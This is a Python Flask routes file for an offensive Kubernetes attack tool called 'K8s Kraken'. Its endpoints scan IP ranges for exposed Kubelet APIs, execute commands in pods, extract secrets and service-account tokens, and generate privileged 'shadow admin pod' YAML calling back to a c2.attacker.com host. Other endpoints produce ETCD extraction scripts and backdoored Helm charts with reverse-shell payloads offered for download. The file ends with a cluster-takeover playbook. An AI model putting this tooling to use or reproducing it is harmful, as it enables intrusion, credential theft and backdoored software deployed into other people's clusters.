"""
Kubernetes Warfare API Routes - K8s Kraken
===========================================
Flask blueprint for K8s cluster attacks.
"""

from flask import Blueprint, request, jsonify, render_template, Response
import json
import yaml
import base64
from datetime import datetime
from typing import Dict, Any
import zipfile
import io

# Import K8s Warfare module
try:
    from tools.k8s_warfare import (
        KubeletExploiter,
        HelmBackdoorGenerator,
        HelmChartType,
        KubeletScanResult,
        scan_kubelet,
        generate_backdoor_chart
    )
    K8S_AVAILABLE = True
except ImportError as e:
    print(f"[WARN] K8s Warfare import error: {e}")
    K8S_AVAILABLE = False

k8s_warfare_bp = Blueprint('k8s_warfare', __name__, url_prefix='/k8s-kraken')


@k8s_warfare_bp.route('/')
@k8s_warfare_bp.route('/dashboard')
def k8s_dashboard():
    """K8s Kraken dashboard"""
    return render_template('k8s_warfare.html')


@k8s_warfare_bp.route('/api/status', methods=['GET'])
def k8s_status():
    """Check K8s Warfare module availability"""
    return jsonify({
        "module": "k8s_warfare",
        "name": "K8s Kraken - Kubernetes Warfare",
        "available": K8S_AVAILABLE,
        "version": "1.0.0",
        "features": [
            "Kubelet API Scanner (10250 port)",
            "Shadow Admin Pod Deployment",
            "ETCD Secret Extraction",
            "Helm Chart Backdoor Generator",
            "DaemonSet Agent Deployment",
            "Service Account Token Theft"
        ],
        "supported_charts": [ct.value for ct in HelmChartType] if K8S_AVAILABLE else []
    })


# ============ KUBELET EXPLOITER ENDPOINTS ============

@k8s_warfare_bp.route('/api/kubelet/scan', methods=['POST'])
def kubelet_scan():
    """
    Scan target for exposed Kubelet API.
    
    Request body:
    {
        "target": "10.0.0.1",
        "port": 10250
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        target = data.get('target')
        
        if not target:
            return jsonify({"success": False, "error": "target is required"}), 400
        
        port = data.get('port', 10250)
        
        exploiter = KubeletExploiter(
            timeout=data.get('timeout', 10),
            verify_ssl=data.get('verify_ssl', False)
        )
        
        result = exploiter.scan_kubelet(target, port)
        
        return jsonify({
            "success": True,
            "result": {
                "target": result.target,
                "port": result.port,
                "auth_status": result.auth_status.value,
                "version": result.version,
                "pods_count": len(result.pods),
                "namespaces": result.namespaces,
                "secrets_accessible": result.secrets_accessible,
                "node_info": result.node_info,
                "exploitable": result.auth_status.value == "anonymous_allowed"
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/kubelet/pods', methods=['POST'])
def kubelet_list_pods():
    """
    List all pods on a node via Kubelet API.
    
    Request body:
    {
        "target": "10.0.0.1",
        "port": 10250
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        target = data.get('target')
        
        if not target:
            return jsonify({"success": False, "error": "target is required"}), 400
        
        exploiter = KubeletExploiter()
        pods = exploiter.list_pods(target, data.get('port', 10250))
        
        # Categorize pods
        privileged_pods = [p for p in pods if p.get('privileged')]
        hostnetwork_pods = [p for p in pods if p.get('host_network')]
        kube_system_pods = [p for p in pods if p.get('namespace') == 'kube-system']
        
        return jsonify({
            "success": True,
            "pods": pods,
            "summary": {
                "total": len(pods),
                "privileged": len(privileged_pods),
                "host_network": len(hostnetwork_pods),
                "kube_system": len(kube_system_pods)
            },
            "high_value_targets": privileged_pods[:5],
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/kubelet/exec', methods=['POST'])
def kubelet_exec():
    """
    Execute command in a container via Kubelet API.
    
    Request body:
    {
        "target": "10.0.0.1",
        "namespace": "default",
        "pod": "my-pod",
        "container": "main",
        "command": ["id"]
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        required = ['target', 'namespace', 'pod', 'container', 'command']
        for field in required:
            if field not in data:
                return jsonify({"success": False, "error": f"{field} is required"}), 400
        
        exploiter = KubeletExploiter()
        success, output = exploiter.exec_in_pod(
            target=data['target'],
            namespace=data['namespace'],
            pod_name=data['pod'],
            container=data['container'],
            command=data['command'],
            port=data.get('port', 10250)
        )
        
        return jsonify({
            "success": success,
            "output": output,
            "command": ' '.join(data['command']),
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/kubelet/secrets', methods=['POST'])
def kubelet_extract_secrets():
    """
    Extract secrets from pods via Kubelet API.
    
    Request body:
    {
        "target": "10.0.0.1",
        "port": 10250
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        target = data.get('target')
        
        if not target:
            return jsonify({"success": False, "error": "target is required"}), 400
        
        exploiter = KubeletExploiter()
        secrets = exploiter.extract_secrets(target, data.get('port', 10250))
        
        # Categorize secrets
        sa_tokens = [s for s in secrets if s.get('type') == 'service_account_token']
        env_secrets = [s for s in secrets if s.get('type') == 'env_variable']
        
        return jsonify({
            "success": True,
            "secrets": secrets,
            "summary": {
                "total": len(secrets),
                "service_account_tokens": len(sa_tokens),
                "env_variables": len(env_secrets)
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/kubelet/shadow-pod', methods=['POST'])
def generate_shadow_pod():
    """
    Generate YAML for a shadow admin pod.
    
    Request body:
    {
        "name": "metrics-helper",
        "namespace": "kube-system",
        "callback_url": "http://c2.attacker.com",
        "privileged": true,
        "host_network": true
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        exploiter = KubeletExploiter()
        yaml_content = exploiter.generate_shadow_pod_yaml(
            name=data.get('name'),
            namespace=data.get('namespace', 'kube-system'),
            image=data.get('image', 'alpine:latest'),
            callback_url=data.get('callback_url'),
            privileged=data.get('privileged', True),
            host_network=data.get('host_network', True),
            host_pid=data.get('host_pid', True)
        )
        
        return jsonify({
            "success": True,
            "yaml": yaml_content,
            "deploy_command": f"kubectl apply -f shadow-pod.yaml",
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/kubelet/etcd-script', methods=['POST'])
def generate_etcd_script():
    """
    Generate ETCD extraction script.
    
    Request body:
    {
        "etcd_endpoint": "https://127.0.0.1:2379"
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        exploiter = KubeletExploiter()
        script = exploiter.generate_etcd_extraction_script(
            etcd_endpoint=data.get('etcd_endpoint', 'https://127.0.0.1:2379')
        )
        
        return jsonify({
            "success": True,
            "script": script,
            "usage": "Run from privileged pod with ETCD cert access",
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============ HELM BACKDOOR ENDPOINTS ============

@k8s_warfare_bp.route('/api/helm/chart-types', methods=['GET'])
def helm_chart_types():
    """Get available Helm chart types for backdoor generation"""
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    chart_info = []
    generator = HelmBackdoorGenerator()
    
    for chart_type in HelmChartType:
        template = generator.CHART_TEMPLATES.get(chart_type, {})
        chart_info.append({
            "type": chart_type.value,
            "name": template.get('name', chart_type.value),
            "description": template.get('description', ''),
            "app_version": template.get('app_version', ''),
            "port": template.get('port', 0),
            "image": template.get('image', '')
        })
    
    return jsonify({
        "success": True,
        "chart_types": chart_info
    })


@k8s_warfare_bp.route('/api/helm/generate', methods=['POST'])
def helm_generate_backdoor():
    """
    Generate a backdoored Helm chart.
    
    Request body:
    {
        "chart_type": "postgresql",
        "callback_url": "http://c2.attacker.com:4444",
        "payload_type": "reverse_shell",
        "version": "1.0.0",
        "include_daemonset": true
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        chart_type_str = data.get('chart_type', 'nginx')
        
        # Convert string to enum
        try:
            chart_type = HelmChartType(chart_type_str)
        except ValueError:
            chart_type = HelmChartType.NGINX
        
        generator = HelmBackdoorGenerator()
        backdoor = generator.generate_chart(
            chart_type=chart_type,
            callback_url=data.get('callback_url'),
            payload_type=data.get('payload_type', 'beacon'),
            version=data.get('version', '1.0.0'),
            include_daemonset=data.get('include_daemonset', True),
            stealth_level=data.get('stealth_level', 'high')
        )
        
        return jsonify({
            "success": True,
            "chart": {
                "name": backdoor.chart_name,
                "type": backdoor.chart_type,
                "version": backdoor.version,
                "payload_type": backdoor.payload_type,
                "description": backdoor.description,
                "files": backdoor.files
            },
            "install_command": f"helm install {backdoor.chart_name} ./{backdoor.chart_name}",
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/helm/download', methods=['POST'])
def helm_download_chart():
    """
    Generate and download backdoored Helm chart as ZIP.
    
    Request body: same as /api/helm/generate
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        chart_type_str = data.get('chart_type', 'nginx')
        
        try:
            chart_type = HelmChartType(chart_type_str)
        except ValueError:
            chart_type = HelmChartType.NGINX
        
        generator = HelmBackdoorGenerator()
        backdoor = generator.generate_chart(
            chart_type=chart_type,
            callback_url=data.get('callback_url'),
            payload_type=data.get('payload_type', 'beacon'),
            version=data.get('version', '1.0.0'),
            include_daemonset=data.get('include_daemonset', True)
        )
        
        # Create ZIP file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            for filename, content in backdoor.files.items():
                full_path = f"{backdoor.chart_name}/{filename}"
                zf.writestr(full_path, content)
        
        zip_buffer.seek(0)
        
        return Response(
            zip_buffer.getvalue(),
            mimetype='application/zip',
            headers={
                'Content-Disposition': f'attachment; filename={backdoor.chart_name}-chart.zip'
            }
        )
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/helm/preview/<filename>', methods=['POST'])
def helm_preview_file(filename: str):
    """
    Preview a specific file from the generated chart.
    
    URL param: filename (e.g., "values.yaml", "templates/deployment.yaml")
    Request body: same as /api/helm/generate
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        
        chart_type_str = data.get('chart_type', 'nginx')
        
        try:
            chart_type = HelmChartType(chart_type_str)
        except ValueError:
            chart_type = HelmChartType.NGINX
        
        generator = HelmBackdoorGenerator()
        backdoor = generator.generate_chart(
            chart_type=chart_type,
            callback_url=data.get('callback_url'),
            payload_type=data.get('payload_type', 'beacon'),
            version=data.get('version', '1.0.0'),
            include_daemonset=data.get('include_daemonset', True)
        )
        
        # Find the requested file
        content = backdoor.files.get(filename)
        
        if content is None:
            return jsonify({
                "success": False,
                "error": f"File not found: {filename}",
                "available_files": list(backdoor.files.keys())
            }), 404
        
        return jsonify({
            "success": True,
            "filename": filename,
            "content": content
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============ UTILITY ENDPOINTS ============

@k8s_warfare_bp.route('/api/scan-range', methods=['POST'])
def scan_range():
    """
    Scan an IP range for exposed Kubelet APIs.
    
    Request body:
    {
        "targets": ["10.0.0.1", "10.0.0.2", "10.0.0.3"],
        "port": 10250
    }
    """
    if not K8S_AVAILABLE:
        return jsonify({"success": False, "error": "K8s module not available"}), 500
    
    try:
        data = request.get_json() or {}
        targets = data.get('targets', [])
        port = data.get('port', 10250)
        
        if not targets:
            return jsonify({"success": False, "error": "targets array is required"}), 400
        
        if len(targets) > 50:
            return jsonify({"success": False, "error": "Maximum 50 targets per scan"}), 400
        
        exploiter = KubeletExploiter(timeout=5)
        results = []
        exploitable = []
        
        for target in targets:
            result = exploiter.scan_kubelet(target, port)
            result_dict = {
                "target": result.target,
                "port": result.port,
                "auth_status": result.auth_status.value,
                "exploitable": result.auth_status.value == "anonymous_allowed"
            }
            results.append(result_dict)
            
            if result_dict["exploitable"]:
                exploitable.append(target)
        
        return jsonify({
            "success": True,
            "results": results,
            "summary": {
                "total_scanned": len(targets),
                "exploitable": len(exploitable),
                "exploitable_targets": exploitable
            },
            "timestamp": datetime.utcnow().isoformat()
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@k8s_warfare_bp.route('/api/attack-playbook', methods=['GET'])
def attack_playbook():
    """Get K8s attack playbook/cheatsheet"""
    playbook = {
        "title": "Kubernetes Cluster Takeover Playbook",
        "phases": [
            {
                "phase": 1,
                "name": "Discovery",
                "steps": [
                    "Scan for exposed Kubelet API (10250)",
                    "Check for anonymous authentication",
                    "Enumerate pods and namespaces",
                    "Identify privileged containers"
                ]
            },
            {
                "phase": 2,
                "name": "Initial Access",
                "steps": [
                    "If Kubelet anonymous: List all pods",
                    "Execute commands in containers",
                    "Extract service account tokens",
                    "Deploy shadow admin pod"
                ]
            },
            {
                "phase": 3,
                "name": "Privilege Escalation",
                "steps": [
                    "Use SA token to access API server",
                    "Check RBAC permissions",
                    "Escape to node if privileged",
                    "Access ETCD for cluster secrets"
                ]
            },
            {
                "phase": 4,
                "name": "Persistence",
                "steps": [
                    "Deploy DaemonSet (runs on all nodes)",
                    "Backdoor Helm charts",
                    "Create rogue ServiceAccount",
                    "Modify admission controllers"
                ]
            },
            {
                "phase": 5,
                "name": "Impact",
                "steps": [
                    "Extract all secrets from ETCD",
                    "Pivot to other namespaces",
                    "Access cloud provider metadata",
                    "Lateral movement to other clusters"
                ]
            }
        ],
        "key_targets": [
            "kube-system namespace pods",
            "ServiceAccount tokens with cluster-admin",
            "ETCD database",
            "Cloud provider credentials (IMDS)"
        ]
    }
    
    return jsonify({
        "success": True,
        "playbook": playbook
    })
